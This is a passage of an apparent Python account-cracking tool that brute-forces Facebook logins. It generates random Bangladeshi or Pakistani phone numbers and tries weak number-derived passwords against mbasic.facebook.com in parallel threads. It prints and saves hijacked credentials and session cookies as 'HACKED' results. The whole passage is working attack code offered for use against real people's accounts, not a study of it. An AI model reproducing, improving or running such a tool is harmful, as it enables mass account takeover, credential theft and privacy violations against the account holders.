        print("\033[38;5;46m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;32m�\033[1;35m�\033[1;34m�\033[1;97m�\033[1;33m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[38;5;196m�\033[1;32m�\033[1;97m�\033[1;35m�\033[1;34m�\033[1;33m�\033[38;5;46m�\033[1;97m�")
        TBH =input(" [] Choose : ")
        if TBH in ["1", "01","A","a"]:
            v1()
      
        if TBH in [" 0", "00"]:
            exit()
        else:
            Main()

def v1():
    user=[]
    os.system('clear')
    print(logo)
    print(" BD SIM CODE=><>< +88017,+88018,+88019,+88014,+88013")
    print("\033[38;5;46m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;32m�\033[1;35m�\033[1;34m�\033[1;97m�\033[1;33m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[38;5;196m�\033[1;32m�\033[1;97m�\033[1;35m�\033[1;34m�\033[1;33m�\033[38;5;46m�\033[1;97m�")
    print(" \033[1;32mPAK SIM CODE=><>< +92301,+92302,+92303,+92305")
    print(" \033[38;5;46m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;32m�\033[1;35m�\033[1;34m�\033[1;97m�\033[1;33m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[38;5;196m�\033[1;32m�\033[1;97m�\033[1;35m�\033[1;34m�\033[1;33m�\033[38;5;46m�\033[1;97m�")
    print(" NOTE ; THOSE  WHO STAY IN THEIR COUNTRY THEY CAN GIVE THEIR SIM CODE NUNBER TO FACEBOOK RANDOM ID CLONE")
    print(" \033[38;5;46m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[1;32m�\033[1;35m�\033[1;34m�\033[1;97m�\033[1;33m�\033[38;5;196m�\033[1;35m�\033[1;34m�\033[1;33m�\033[1;32m�\033[1;97m�\033[38;5;196m�\033[38;5;46m�\033[38;5;196m�\033[1;32m�\033[1;97m�\033[1;35m�\033[1;34m�\033[1;33m�\033[38;5;46m�\033[1;97m�")
    
    kode = input(' [] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' FACEBOOK VIP CLONING (BD NUMBER) '
    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;33m[]  TOTAL IDS :\033[1;92m '+tl)
        print(f"\033[1;33m[]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
        print(' \033[1;33m[]  THE CRACK PROCESS HAS BEEN STARTED')
        print(' \033[1;33m[]  WAIT FOR IDS ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [] Crack process has been completed')
    print(' [] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mANONYMOUS-TBH2.0\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=zJBAZQU23oW92U52eFUrjnYO; sb=0JBAZc003cnaBOO6I04y6X08; m_pixel_ratio=2; wd=360x668; fr=0tMqz4So2fVbfDZoe..BlQOSm.56.AAA.0.0.BlQPE0.AWUQZ5fvQD0',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"RMX3171"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[HACKED successful-OK] {uid}|{ps}")
                print(f"\n[COOKIE] : {coki}")
                open('/sdcard/TBH2.0/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SORRY-CP] {uid}|{ps}")
                open('/sdcard/TBH2.0-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[  TBH2.0] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()